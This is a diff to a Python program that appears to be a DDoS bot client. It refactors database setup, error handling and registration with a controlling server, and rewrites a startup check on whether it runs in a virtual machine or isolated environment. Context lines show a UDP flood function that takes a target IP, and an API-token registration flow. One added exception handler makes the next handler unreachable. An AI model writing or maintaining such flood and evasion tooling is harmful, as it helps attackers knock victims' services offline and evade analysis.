@@ -84,34 +84,35 @@ def targetData(command, user_name=None, ID=None, threadPermisstion='Allow', thre
     Returns:
         str or list: A message or data depending on the command.
     """
-    conn = sqlite3.connect('info.db')
+    conn = sqlite3.connect(config.DB_URI)
     cursor = conn.cursor()
 
-    # Create tables
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS target_data (
-            id TEXT PRIMARY KEY NOT NULL,
-            target_name TEXT NOT NULL,
-            is_registor TEXT
-        )
-    """)
-
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS therade_permission (
-            id TEXT PRIMARY KEY NOT NULL,
-            threadPermission TEXT NOT NULL
-        )
-    """)
-
-    cursor.execute("""
-        CREATE TABLE IF NOT EXISTS thread_status (
-            thread_id TEXT PRIMARY KEY NOT NULL,
-            threadStatus TEXT NOT NULL
-        )
-    """)
 
     try:
-        if command == 'create_target' and user_name and ID:
+        if command == 'create_all_table':
+            # Create tables
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS target_data (
+                    id TEXT PRIMARY KEY NOT NULL,
+                    target_name TEXT NOT NULL,
+                    is_registor TEXT
+                )
+            """)
+
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS therade_permission (
+                    id TEXT PRIMARY KEY NOT NULL,
+                    threadPermission TEXT NOT NULL
+                )
+            """)
+
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS thread_status (
+                    thread_id TEXT PRIMARY KEY NOT NULL,
+                    threadStatus TEXT NOT NULL
+                )
+            """)
+        elif command == 'create_target' and user_name and ID:
             try:
                 cursor.execute('INSERT INTO target_data(id, target_name, is_registor) VALUES (?, ?, ?)', (ID, user_name, '0'))
                 conn.commit()
@@ -152,7 +153,7 @@ def targetData(command, user_name=None, ID=None, threadPermisstion='Allow', thre
 
     except Exception as e:
         print(f"Error: {e}")
-        return "Something went wrong"
+        return {'message':"Something went wrong"}
 
     finally:
         conn.close()
@@ -439,7 +440,7 @@ def initUdpFlood(TARGET_IP,THREAD_COUNT=5,PACKET_SIZE = 1024):
 
 
 # setting varible
-built_in_command = config.BUIT_IN_COMMAND
+built_in_command = config.BUILT_IN_COMMAND
 apiToken = config.API_TOKEN
 
 logger = logging.getLogger(__name__)
@@ -697,6 +698,8 @@ def Registor(target_name, apiToken):
         if POST.status_code == 200:
             targetData(command='create_target', user_name=POST.json()['target_name'])
             return POST.json()
+    except Exception as e:
+        return f"Error during registration: {str(e)}"
     except requests.exceptions.RequestException as e:
         return f"Error during registration: {str(e)}"
 
@@ -1124,6 +1127,8 @@ if __name__ == '__main__':
     # Check if running in a virtual machine or isolated environment
     print("Checking if running in a VM or isolated environment...")
     if not is_virtual_env():
-        print("Running in a VM or isolated environment. Exiting.")
+        print("Not running in a VM or isolated environment. Exiting.")
         sys.exit(0)
-    main()
+    else:
+        print("Running in a VM or isolated environment. Continuing execution.")
+        main()
